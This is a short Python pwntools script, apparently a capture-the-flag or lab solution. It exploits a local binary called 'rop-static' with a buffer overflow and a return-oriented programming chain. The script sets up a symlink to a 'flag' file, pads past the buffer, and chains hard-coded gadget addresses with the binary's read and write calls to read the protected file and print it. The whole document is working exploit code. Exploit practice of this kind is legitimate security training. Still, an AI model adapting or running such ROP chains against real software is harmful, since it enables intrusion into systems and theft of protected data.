from pwn import *
import os

# This code requires a symbolic link
if os.path.exists("input!"):
    os.remove("input!")
os.symlink("flag", "input!")

# Addresses needed for the attack
pop_ret_addr = 0x0804810c # pop ebp ret
pop_pop_ret_addr = 0x080482ca # From ROPgadget --binary ./rop-static
twelve_addr = 0x08048109 # 12 bytes esp inc ret
pop_ebx = 0x08048162 # Pop ebx pop ebp ret

read_addr = ELF('./rop-static').symbols['read']
write_addr = ELF('./rop-static').symbols['write']

#syscall_addr = 0x8049330
data_addr = 0x8049330
string_addr = 0x8048326
run_addr = 0x08048197
five_addr = 0x8048021

# Launch processs and send rop chain
p = process('./rop-static')

inp = 'a' * 208 + 'bbbb' + p32(read_addr) + p32(twelve_addr) + p32(0) + p32(0) + p32(0) + p32(pop_ebx) + p32(string_addr) + p32(0)
inp = inp + p32(pop_ret_addr) + p32(five_addr+8) + p32(twelve_addr - 3)  + (p32(data_addr) * 3) + p32(run_addr) + "D" * 24
inp = inp + p32(read_addr) + p32(twelve_addr) + p32(3) + p32(data_addr) + p32(0x200)
inp = inp + p32(write_addr) + p32(twelve_addr) + p32(1) + p32(data_addr) + p32(0x200) + "CCCC"


p.sendline(inp)
# View flag
p.interactive()
